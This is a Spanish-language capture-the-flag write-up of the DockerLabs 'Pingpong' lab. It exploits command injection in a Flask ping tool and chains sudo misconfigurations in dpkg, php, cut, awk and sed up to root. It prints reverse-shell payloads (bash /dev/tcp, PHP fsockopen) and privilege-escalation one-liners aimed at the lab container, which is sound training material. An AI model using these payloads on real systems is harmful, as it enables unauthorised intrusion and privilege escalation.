---
title: DockerLabs - Pingpong
summary: "Write-up del laboratorio Pingpong de DockerLabs"
author: elcybercurioso
date: 2025-11-25
categories: [Post, DockerLabs]
tags: [medio, command injection, rce, sudo]
media_subpath: "/assets/img/posts/dockerlabs_pingpong"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts 
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
5000/tcp open  upnp
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ nmap -sCV -p80,443,5000 172.17.0.2                         
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=example.com/organizationName=Your Organization/stateOrProvinceName=California/countryName=US
| Not valid before: 2024-05-19T14:20:49
|_Not valid after:  2025-05-19T14:20:49
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5000/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: Ping Test
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
```

## análisis

### Puerto 80

Revisando el puerto 80 en busca de recursos existentes, encontramos que existe uno llamado `machine.php`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/machine.php          (Status: 200) [Size: 6989]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Al ir a comprobar lo que contiene, vemos que nos muestra un listado de máquinas de DockerLabs:

![Desktop View](/20251116190506.webp){: width="972" height="589" .shadow}


Sin embargo, tras revisar la página, no encontramos nada relevante.

### Puerto 5000

En el puerto 5000 encontramos una interfaz que nos permite indicar una IP, y realizar un ping hacia dicha IP:

![Desktop View](/20251116190647.webp){: width="972" height="589" .shadow}

Probamos a hacer ping hacia nuestra máquina de atacante:

![Desktop View](/20251116190806.webp){: width="600" height="420" .shadow}

Y al ponernos en escucha con **tcpdump** antes de lanzar el ping, deberíamos ver las trazas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ sudo tcpdump -i docker0 icmp                                                                                                                                  
[sudo] password for elcybercurioso: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
XX:XX:XX.XXXXXX IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 3, seq 1, length 64
XX:XX:XX.XXXXXX IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 3, seq 1, length 64
XX:XX:XX.XXXXXX IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 3, seq 2, length 64
XX:XX:XX.XXXXXX IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 3, seq 2, length 64
```

## acceso inicial (bobby)

Al probar si el campo es vulnerable a inyección de comandos, vemos que lo es, ya que podemos concatenar otro comando indicando un punto y coma (`;`), y posteriormente un comando, cuyo resultado lo vemos en la respuesta:

![Desktop View](/20251116190859.webp){: width="600" height="420" .shadow}

Dado que contamos con Ejecución Remota de Comandos (RCE), procedemos a enviar una consola a nuestra máquina:

![Desktop View](/20251116191035.webp){: width="600" height="420" .shadow}

```bash
<una IP>; bash -c "bash -i >& /dev/tcp/<nuestra IP>/<puerto en escucha> 0>&1"
```

Habiéndonos puesto en escucha con **nc**, al ejecutar el comando anterior deberíamos de obtener una consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ nc -nlvp 4444                                                                                                                                            
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 56956
freddy@2dc07e767ff1:~$ whoami
whoami
freddy
freddy@2dc07e767ff1:~$ hostname -I
hostname -I
172.17.0.2
```

Para poder manejarnos con mejor comodidad, procedemos a tratar la consola:

```bash
freddy@2dc07e767ff1:~$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
freddy@2dc07e767ff1:~$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ stty raw -echo;fg           
[1]  + continued  nc -nlvp 4444
                               reset xterm
freddy@2dc07e767ff1:~$ export TERM=xterm
freddy@2dc07e767ff1:~$ export SHELL=bash
freddy@2dc07e767ff1:~$ stty rows 49 columns 210
```

Una vez dentro, comprobamos el script de la aplicación que hemos visto que está desplegada en el puerto 5000, donde confirmamos que nuestro input se está concatenando al comando `ping`, permitiendonos ejecutar comandos remotamente:

```bash
freddy@2dc07e767ff1:~/Desktop/flaskapp$ cat app.py 
from flask import Flask, request, render_template
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    ip_address = ''
    ping_result = ''
    if request.method == 'POST':
        ip_address = request.form.get('ip_address')
        ping_result = ping_ip(ip_address)
    return render_template('index.html', ip_address=ip_address, ping_result=ping_result)

def ping_ip(ip):
    try:
        cmd = f"ping -c 4 {ip}"
        output = subprocess.check_output(cmd, shell=True, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return str(e)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

## movimiento lateral (bobby)

A la hora de revisar los permisos SUDO del usuario `freddy`, vemos que podemos ejecutar el binario `/usr/bin/dpkg` con los permisos del usuario `bobby`:

```bash
freddy@2dc07e767ff1:~$ sudo -l
Matching Defaults entries for freddy on 2dc07e767ff1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User freddy may run the following commands on 2dc07e767ff1:
    (bobby) NOPASSWD: /usr/bin/dpkg
```

Encontramos en [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/#sudo) que podemos obtener una consola como el usuario sobre el cual tenemos permisos SUDO empleando los siguientes comandos:

![Desktop View](/20251116191738.webp){: width="972" height="589" .shadow}

Procedemos a ejecutar los comandos que mencionan en el apartado `a`, el cual indica que debemos ejecutar `sudo -u bobby dpkg`, y dentro introducir por teclado `!/bin/bash`:

![Desktop View](/20251116191931.webp){: width="600" height="420" .shadow}

De esta manera, habremos invocado una consola `bash` como el usuario `bobby`:

![Desktop View](/20251116191947.webp){: width="600" height="420" .shadow}

## movimiento lateral (gladys)

Vemos que el usuario `bobby` también tiene permisos SUDO asignados, los cuales permite ejecutar el binario `/usr/bin/php` como la usuaria `gladys`:

```bash
bobby@2dc07e767ff1:/home/freddy$ sudo -l
Matching Defaults entries for bobby on 2dc07e767ff1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bobby may run the following commands on 2dc07e767ff1:
    (gladys) NOPASSWD: /usr/bin/php
```
 
Nuevamente, en [GTFOBins](https://gtfobins.github.io/gtfobins/php/#sudo) nos indican que para el binario `php` podemos obtener una consola como otro usuario con el siguiente comando:

![Desktop View](/20251116192029.webp){: width="972" height="589" .shadow}

Debido a errores que ocurren a la hora de invocar una consola en la propia máquina en la que nos encontramos, procedemos a desplegar un nuevo contenedor con `debian`, el cual tras configurarlo, será el que reciba la consola:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Pingpong]
└─$ sudo docker pull debian && sudo docker run -it debian
Using default tag: latest
latest: Pulling from library/debian
Digest: sha256:01a723bf5bfb21b9dda0c9a33e0538106e4d02cce8f557e118dd61259553d598
Status: Image is up to date for debian:latest
docker.io/library/debian:latest
root@8c3ae5b01f7b:/# hostname -I
172.17.0.3
```

Procedemos a actualizarlo , a instalarle **netcat**, y ponernos en escucha:

```bash 
root@8c3ae5b01f7b:/# apt update
Get:1 http://deb.debian.org/debian trixie InRelease [140 kB]
Get:2 http://deb.debian.org/debian trixie-updates InRelease [47.3 kB]

root@8c3ae5b01f7b:/# apt install netcat-traditional
Installing:                     
  netcat-traditional

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 3
  Download size: 63.2 kB
  Space needed: 142 kB / 39.2 GB available

root@8c3ae5b01f7b:/# nc -nlvp 4444
listening on [any] 4444 ...
```

Una vez configurado el contenedor, procedemos a enviar la consola con el siguiente comando:

```bash
bobby@815c8a8e5b2d:/home/freddy$ sudo -u gladys php -r '$sock=fsockopen("<IP del contenedor>",<puerto del contenedor>);exec("bash <&3 >&3 2>&3");'
```

En el contenedor comprobamos que hemos obtenido la consola, y que se mantiene estable:

```bash
connect to [172.17.0.3] from (UNKNOWN) [172.17.0.2] 44090
bash -i
gladys@815c8a8e5b2d:/home/freddy$ whoami
whoami
gladys
```

Al igual que antes, procedemos a tratar la consola para poder operar con mejor facilidad:

```bash
gladys@815c8a8e5b2d:/home/freddy$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
gladys@815c8a8e5b2d:/home/freddy$ ^Z
[1]+  Stopped                 nc -nlvp 4444
root@8c3ae5b01f7b:/# stty raw -echo;fg
nc -nlvp 4444
             reset xterm
gladys@815c8a8e5b2d:/home/freddy$ export TERM=xterm
gladys@815c8a8e5b2d:/home/freddy$ export SHELL=bash
gladys@815c8a8e5b2d:/home/freddy$ stty rows 49 columns 210
```

## movimiento lateral (chocolatito)

Nos encontramos que la usuaria `gladys` también tiene permisos SUDO asignados, que en este caso permite ejecutar el comando `/usr/bin/cut` como el usuario `chocolatito`:

```bash
gladys@815c8a8e5b2d:~$ sudo -l
Matching Defaults entries for gladys on 815c8a8e5b2d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on 815c8a8e5b2d:
    (chocolatito) NOPASSWD: /usr/bin/cut
```

Una vez más, en [GTFOBins](https://gtfobins.github.io/gtfobins/cut/#sudo) nos detallan que podemos llegar a leer ficheros con los permisos del usuario sobre el cual tengamos permisos SUDO empleando el siguiente comando:

![Desktop View](/20251116200320.webp){: width="972" height="589" .shadow}

Buscamos posibles ficheros que pertenezcan al usuario `chocolatito`, los cuales podrían contener alguna información que nos pueda servir para movernos lateralemente:

```bash
gladys@815c8a8e5b2d:~$ find / -user chocolatito 2>/dev/null
/home/chocolatito
/opt/chocolatitocontraseña.txt
```

Encontramos el fichero `/opt/chocolatitocontraseña.txt`, el cual, empleando el comando que nos indicaban anteriormente, lo podemos leer:

```bash
gladys@815c8a8e5b2d:~$ sudo -u chocolatito cut -d "" -f1 "/opt/chocolatitocontraseña.txt"
c******************
```

Probamos a conectarnos como el usuario `chocolatito`, y vemos que la contraseña es correcta:

```bash
gladys@815c8a8e5b2d:~$ su chocolatito
Password: 
chocolatito@815c8a8e5b2d:/home/gladys$ whoami
chocolatito
```

## movimiento lateral (theboss)

Miramos para el usuario `chocolatito` los permisos SUDO que tiene, y vemos que en este caso podemos ejecutar el binario `/usr/bin/awk` como el usuario `theboss`:

```bash
chocolatito@815c8a8e5b2d:/home$ sudo -l
Matching Defaults entries for chocolatito on 815c8a8e5b2d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chocolatito may run the following commands on 815c8a8e5b2d:
    (theboss) NOPASSWD: /usr/bin/awk
```

 Comprobamos en [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#sudo) si podemos llegar a aprovecharnos de esta configuración, y vemos que sí es posible utilizando el siguiente comando:

![Desktop View](/20251116200855.webp){: width="972" height="589" .shadow}

Empleamos el comando que nos indican para invocar una consola como el usuario `theboss`:

```bash
chocolatito@815c8a8e5b2d:/home$ sudo -u theboss awk 'BEGIN {system("/bin/bash")}'
theboss@815c8a8e5b2d:/home$ whoami
theboss
```

## escalada de privilegios (root)

El usuario `theboss` vemos que también tiene permisos SUDO, permitiendo ejecutar el binario `/usr/bin/sed` como el usuario `root`:

```bash
theboss@815c8a8e5b2d:/home$ sudo -l
Matching Defaults entries for theboss on 815c8a8e5b2d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User theboss may run the following commands on 815c8a8e5b2d:
    (root) NOPASSWD: /usr/bin/sed
```

 Nuevamente en [GTFOBins](https://gtfobins.github.io/gtfobins/sed/#sudo) nos indican como podemos usar, en este caso el binario `/usr/bin/sed`, a nuestro favor, pudiendo llegar a obtener una consola como el usuario `root`:

![Desktop View](/20251116201011.webp){: width="972" height="589" .shadow}

Tras ejecutar el comando que nos indican, vemos que logramos finalmente invocar una consola como el usuario `root`:

```bash
theboss@815c8a8e5b2d:/home$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>